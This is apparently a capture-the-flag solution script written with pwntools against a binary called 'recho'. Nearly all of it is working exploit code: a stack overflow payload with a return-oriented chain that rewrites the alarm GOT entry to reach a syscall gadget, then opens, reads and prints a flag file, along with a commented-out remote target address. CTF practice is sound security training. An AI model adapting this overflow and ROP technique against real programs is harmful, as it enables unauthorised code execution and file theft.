#!  /usr/bin/env    python

from pwn import *

sh = process("recho")
#sh = remote("159.138.137.79", 65458)
elf = ELF("recho")
context.log_level = "debug"

alarm_got = elf.got["alarm"]
log.info("alarm_got -> " + hex(alarm_got))
add_rdi_al = 0x40070d
pop_rdi = 0x4008a3
pop_rsi_r15 = 0x4008a1
pop_rdx = 0x4006fe
pop_rax = 0x4006fc
flag = 0x601058
syscall = elf.plt["alarm"]


def main():
    payload = "dyf".ljust(0x38, "\x00")
    payload += p64(pop_rdi) + p64(alarm_got) + p64(pop_rax) + p64(5) + p64(add_rdi_al) 
    payload += p64(pop_rdi) + p64(flag) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(pop_rdx) + p64(0)
    payload += p64(pop_rax) + p64(2) + p64(syscall)
    payload += p64(pop_rdi) + p64(3) + p64(pop_rsi_r15) + p64(elf.bss(0)) + p64(0) + p64(pop_rdx) + p64(40) + p64(elf.plt["read"])
    payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(elf.bss(0)) + p64(0) + p64(pop_rdx) + p64(40) + p64(elf.plt["write"]) 
    sh.recv()
    sh.sendline(str(0x1000))
    sh.sendline(payload)    
    #gdb.attach(sh)
    sh.shutdown()
    sh.interactive()


if __name__ == "__main__":
    main()
